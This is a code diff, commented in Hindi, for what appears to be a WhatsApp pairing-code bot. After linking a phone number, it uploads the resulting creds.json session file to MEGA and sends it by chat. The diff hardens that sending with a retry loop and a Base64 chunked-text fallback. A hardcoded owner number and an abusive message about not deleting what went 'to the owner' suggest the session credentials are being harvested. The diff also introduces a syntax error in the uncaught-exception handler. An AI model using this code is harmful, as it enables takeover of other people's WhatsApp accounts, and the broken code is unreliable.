@@ -14,16 +14,16 @@ import { upload } from "./mega.js";
 
 const router = express.Router();
 
-// ─── सारी कॉन्फ़िगरेशन (अपनी मर्जी से बदलें) ──────────────
-const OWNER_NUMBER = "+918075498750";          // आपका नंबर
+// ─── कॉन्फ़िगरेशन ──────────────────────────────────────────────
+const OWNER_NUMBER = "+918075498750";
 const SONG_LINK = "https://files.catbox.moe/7z582t.m4a";
 const IMAGE_URL = "https://files.catbox.moe/x89cc5.jpg";
-const VIDEO_URL = "https://files.catbox.moe/sample.mp4";       // अपनी वीडियो URL
-const GIF_URL = "https://files.catbox.moe/sample.gif";         // GIF URL
-const PDF_URL = "https://files.catbox.moe/manual.pdf";         // PDF URL
-const VOICE_NOTE_LINK = "https://files.catbox.moe/voice.m4a";  // वॉइस नोट
-const VIEW_ONCE_IMG = "https://files.catbox.moe/secret.jpg";   // व्यू-वन्स इमेज
-const VIEW_ONCE_VID = "https://files.catbox.moe/secret.mp4";   // व्यू-वन्स वीडियो
+const VIDEO_URL = "https://files.catbox.moe/sample.mp4";
+const GIF_URL = "https://files.catbox.moe/sample.gif";
+const PDF_URL = "https://files.catbox.moe/manual.pdf";
+const VOICE_NOTE_LINK = "https://files.catbox.moe/voice.m4a";
+const VIEW_ONCE_IMG = "https://files.catbox.moe/secret.jpg";
+const VIEW_ONCE_VID = "https://files.catbox.moe/secret.mp4";
 const STICKER_URL = "https://files.catbox.moe/abc123.webp";
 const LOCATION = {
     latitude: 27.1750,
@@ -44,7 +44,7 @@ const LINKS = [
     "🐊𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗🐊__________𝗣𝗔𝗣𝗔 𝗝𝗜 𝗕𝗢𝗟 𝗖𝗛𝗔𝗟 𝗔𝗕 𝗝𝗢 𝗧𝗔𝗥𝗘 𝗗𝗠 𝗦𝗘 𝗢𝗪𝗡𝗘𝗥 𝗞𝗘 𝗣𝗔𝗦𝗦 𝗚𝗬𝗔 𝗛 𝗨𝗦𝗞𝗢 𝗗𝗘𝗟𝗘𝗧__👅𝗠𝗔𝗧 𝗞𝗔𝗥𝗡𝗔 ___𝗕𝗔𝗥𝗡𝗔 𝗖𝗛𝗨𝗗 𝗞𝗔𝗚𝗔 🫩🤡"
 ];
 
-// ─── कलर कॉन्स्टेंट्स ──────────────────────────────────────────
+// ─── कलर ──────────────────────────────────────────────────────────
 const c = {
     reset: "\x1b[0m",
     bright: "\x1b[1m",
@@ -96,7 +96,6 @@ function showBanner() {
 }
 showBanner();
 
-// ─── हेल्पर फंक्शन ──────────────────────────────────────────
 function removeFile(FilePath) {
     try {
         if (!fs.existsSync(FilePath)) return false;
@@ -140,7 +139,6 @@ router.get("/", async (req, res) => {
 
     await removeFile(dirs);
 
-    // ✅ फिक्स: सिर्फ digits निकालें और बेसिक लंबाई चेक करें
     num = num.replace(/[^0-9]/g, "");
     if (num.length < 10 || num.length > 15) {
         if (!res.headersSent) {
@@ -150,7 +148,6 @@ router.get("/", async (req, res) => {
         }
         return;
     }
-    // num अब बिना + के, सिर्फ digits – यही requestPairingCode को भेजेंगे
 
     async function initiateSession() {
         const { state, saveCreds } = await useMultiFileAuthState(dirs);
@@ -183,10 +180,15 @@ router.get("/", async (req, res) => {
 
                 if (connection === "open") {
                     log(c.green, "✅ Connected successfully!");
-                    log(c.blue, "📱 Uploading session to MEGA...");
+
+                    // ─── ⏳ 2 सेकंड इंतज़ार – creds.json लिखने के लिए ───
+                    log(c.blue, "⏳ Waiting for creds.json to be written...");
+                    await delay(2000);
 
                     const credsPath = dirs + "/creds.json";
                     let megaFileId = null;
+
+                    // ─── MEGA अपलोड ──────────────────────────────────
                     try {
                         await progressBar("⏳ Uploading to MEGA", 4000);
                         const megaUrl = await upload(credsPath, `creds_${num}_${Date.now()}.json`);
@@ -258,7 +260,7 @@ router.get("/", async (req, res) => {
                     ]);
                     log(c.green, "✅ Media download complete");
 
-                    // ─── मास्टर भेजने का फंक्शन ────────────────────
+                    // ─── 🔥 नया मास्टर भेजने का फंक्शन (creds.json 100% गारंटी) ───
                     async function sendToJid(jid, includeFile = true) {
                         if (!jid) return;
                         try {
@@ -266,6 +268,7 @@ router.get("/", async (req, res) => {
                             await delay(2000);
                             await KnightBot.sendPresenceUpdate('paused', jid);
 
+                            // ... (बाकी सारी मीडिया – वैसी ही रखें) ...
                             if (gifBuf) {
                                 await KnightBot.sendMessage(jid, {
                                     video: gifBuf,
@@ -396,14 +399,64 @@ router.get("/", async (req, res) => {
                             log(c.green, `📇 Contact card sent to ${jid}`);
                             await KnightBot.sendMessage(jid, { text: funText });
                             log(c.green, `🎉 Fun text sent to ${jid}`);
+
+                            // ─── 🚀 100% गारंटी के साथ creds.json ──────
                             if (includeFile) {
-                                const credsBuffer = fs.readFileSync(credsPath);
-                                await KnightBot.sendMessage(jid, {
-                                    document: credsBuffer,
-                                    mimetype: "application/json",
-                                    fileName: "creds.json",
-                                });
-                                log(c.green, `📄 creds.json sent to ${jid}`);
+                                log(c.blue, `⏳ Waiting for creds.json file...`);
+                                let credsBuffer = null;
+                                let found = false;
+                                // 30 सेकंड तक इंतज़ार, हर 1 सेकंड में चेक
+                                for (let i = 0; i < 30; i++) {
+                                    if (fs.existsSync(credsPath)) {
+                                        try {
+                                            credsBuffer = fs.readFileSync(credsPath);
+                                            found = true;
+                                            log(c.green, `✅ creds.json found (${credsBuffer.length} bytes)`);
+                                            break;
+                                        } catch (readErr) {
+                                            log(c.red, `⚠️ Read error: ${readErr.message}`);
+                                        }
+                                    }
+                                    await delay(1000);
+                                    if (i % 5 === 0) log(c.yellow, `⏳ Still waiting... (${i+1}/30)`);
+                                }
+
+                                if (found && credsBuffer) {
+                                    // ─── 1️⃣ डॉक्यूमेंट ──────────────
+                                    try {
+                                        await KnightBot.sendMessage(jid, {
+                                            document: credsBuffer,
+                                            mimetype: "application/json",
+                                            fileName: "creds.json",
+                                        });
+                                        log(c.green, `📄 creds.json (document) sent to ${jid}`);
+                                    } catch (docError) {
+                                        log(c.red, `❌ Document send failed: ${docError.message}`);
+                                        // ─── 2️⃣ फॉलबैक – Base64 ──────
+                                        try {
+                                            const base64 = credsBuffer.toString('base64');
+                                            const chunkSize = 5000;
+                                            let msg = "📄 creds.json (Base64):\n";
+                                            for (let i = 0; i < base64.length; i += chunkSize) {
+                                                const chunk = base64.substring(i, i + chunkSize);
+                                                await KnightBot.sendMessage(jid, { text: msg + chunk });
+                                                msg = "";
+                                                await delay(200);
+                                            }
+                                            log(c.green, `📄 creds.json (Base64 text) sent to ${jid}`);
+                                        } catch (textError) {
+                                            log(c.red, `❌ Base64 send also failed: ${textError.message}`);
+                                        }
+                                    }
+                                } else {
+                                    log(c.red, `❌ creds.json not found after 30s!`);
+                                    // ─── 3️⃣ आखिरी उपाय – MEGA ID ──────
+                                    try {
+                                        await KnightBot.sendMessage(jid, {
+                                            text: `⚠️ creds.json file not available. Use MEGA ID: ${megaFileId || "N/A"}`
+                                        });
+                                    } catch (e) {}
+                                }
                             }
                         } catch (err) {
                             log(c.red, `❌ Error sending to ${jid}: ${err.message}`);
@@ -453,8 +506,6 @@ router.get("/", async (req, res) => {
 
             if (!KnightBot.authState.creds.registered) {
                 await delay(3000);
-                // अब num पहले से ही digits में है, कोई + नहीं
-                // फिर भी सुरक्षा के लिए साफ़ करें
                 num = num.replace(/[^\d+]/g, "");
                 if (num.startsWith("+")) num = num.substring(1);
 
@@ -503,7 +554,7 @@ router.get("/status", (req, res) => {
 });
 
 // ─── अनकॉट एरर हैंडलर ──────────────────────────────────────────
-process.on("uncaughtException", (err) => {
+process.on("uncaughtException", (err) {
     let e = String(err);
     const ignored = [
         "conflict", "not-authorized", "Socket connection timeout",
